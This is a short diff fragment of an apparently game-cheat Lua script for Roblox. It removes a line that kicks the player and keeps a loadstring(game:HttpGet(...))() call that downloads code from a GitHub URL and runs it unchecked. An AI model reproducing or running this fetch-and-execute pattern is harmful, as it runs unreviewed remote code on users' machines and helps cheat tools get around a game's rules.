@@ -144,8 +144,7 @@ httprequest(
  } 
  }} 
  }) 
- })
-game:GetService("Players").LocalPlayer:Kick("???") loadstring(game:HttpGet('https://raw.githubusercontent.com/ginchao/VNPxFree2/main/Second%20Sea'))() 
+ }) loadstring(game:HttpGet('https://raw.githubusercontent.com/ginchao/VNPxFree2/main/Second%20Sea'))() 
 end
 end
 
